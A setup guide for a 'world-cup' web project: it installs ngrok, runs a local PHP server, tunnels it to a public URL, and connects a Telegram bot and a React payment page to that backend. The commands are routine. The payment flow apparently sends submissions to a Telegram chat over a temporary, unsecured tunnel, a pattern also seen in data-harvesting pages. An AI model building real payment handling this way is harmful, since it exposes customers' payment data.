# Using ngrok to Make Backend Accessible

## 🚀 Quick Setup with ngrok

### Step 1: Install ngrok

**Option A: Download from website**
1. Go to https://ngrok.com/download
2. Download for your OS (Linux/Mac/Windows)
3. Extract the file

**Option B: Linux with apt**
```bash
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update && sudo apt install ngrok
```

**Option C: Mac with Homebrew**
```bash
brew install ngrok/ngrok/ngrok
```

### Step 2: Setup PHP Server Locally

Navigate to your backend folder and start PHP server:

```bash
cd world-cup/backend
php -S localhost:8000
```

You should see:
```
PHP 8.x Development Server (http://localhost:8000) started
```

### Step 3: Start ngrok

Open a **NEW terminal** (keep PHP server running) and run:

```bash
ngrok http 8000
```

You'll see output like:
```
ngrok                                                                           
                                                                                
Session Status                online                                            
Account                       your-email (Plan: Free)                          
Version                       3.x.x                                            
Region                        United States (us)                               
Latency                       -                                                
Web Interface                 http://127.0.0.1:4040                           
Forwarding                    https://abc123.ngrok-free.app -> http://localhost:8000

Connections                   ttl     opn     rt1     rt5     p50     p90      
                              0       0       0.00    0.00    0.00    0.00     
```

**Copy the Forwarding URL:** `https://abc123.ngrok-free.app`

### Step 4: Get Your Chat ID

1. Send a message to your bot: https://t.me/worldcupevidensbot
2. Visit: `https://abc123.ngrok-free.app/test-bot.php`
3. Copy your Chat ID from the page

### Step 5: Configure Backend

Edit `backend/config.php`:
```php
define('TELEGRAM_CHAT_ID', '123456789'); // Your actual Chat ID
```

### Step 6: Update Frontend

Edit `src/pages/PaymentPage.tsx` line 12:
```typescript
const API_ENDPOINT = "https://abc123.ngrok-free.app/submit-payment.php";
```

### Step 7: Test Everything

1. Visit test page: `https://abc123.ngrok-free.app/test-bot.php`
2. Click "Send Test Message"
3. Check Telegram - you should get a message!
4. Try full payment flow on your website

## 📝 Important Notes

### ngrok Free Plan Limitations:
- ✅ URL changes every time you restart ngrok
- ✅ You'll need to update frontend URL when restarting
- ✅ Session timeout after inactivity
- ✅ Limited to 40 connections/minute

### Keep These Running:
1. **Terminal 1:** PHP Server (`php -S localhost:8000`)
2. **Terminal 2:** ngrok (`ngrok http 8000`)
3. **Terminal 3:** Your React app (`npm run dev`)

### Pro Tip: Use a Static Domain (Optional)

Sign up for ngrok free account at https://dashboard.ngrok.com/signup

Then run:
```bash
ngrok config add-authtoken YOUR_AUTH_TOKEN
ngrok http 8000 --domain=your-custom-name.ngrok-free.app
```

This gives you a consistent URL!

## 🐛 Troubleshooting

### Problem: "ngrok not found"
**Solution:** Make sure ngrok is in your PATH or use full path:
```bash
./ngrok http 8000
```

### Problem: CORS errors with ngrok
**Solution:** ngrok should work fine with our .htaccess settings. If issues persist, the headers are already configured.

### Problem: ngrok URL changes
**Solution:** 
1. Get new URL from ngrok terminal
2. Update PaymentPage.tsx with new URL
3. Restart your React app

### Problem: Connection refused
**Solution:** 
- Make sure PHP server is running on port 8000
- Check if port 8000 is available: `lsof -i :8000`

## 🔄 Quick Restart Commands

If you need to restart everything:

```bash
# Terminal 1 - Backend
cd world-cup/backend
php -S localhost:8000

# Terminal 2 - ngrok
ngrok http 8000

# Terminal 3 - Frontend (from world-cup folder)
npm run dev
```

## ✅ Verification Checklist

- [ ] PHP server running on localhost:8000
- [ ] ngrok forwarding to localhost:8000
- [ ] Sent message to @worldcupevidensbot
- [ ] Got Chat ID from test-bot.php via ngrok URL
- [ ] Updated config.php with Chat ID
- [ ] Updated PaymentPage.tsx with ngrok URL
- [ ] Test message sent successfully
- [ ] Payment flow works end-to-end

## 🚀 Production Deployment (Later)

For production, you should:
1. Use a real PHP hosting service (not ngrok)
2. Get a proper domain name
3. Use HTTPS
4. Add rate limiting
5. Secure the API endpoint

But for testing, ngrok is perfect! 🎉
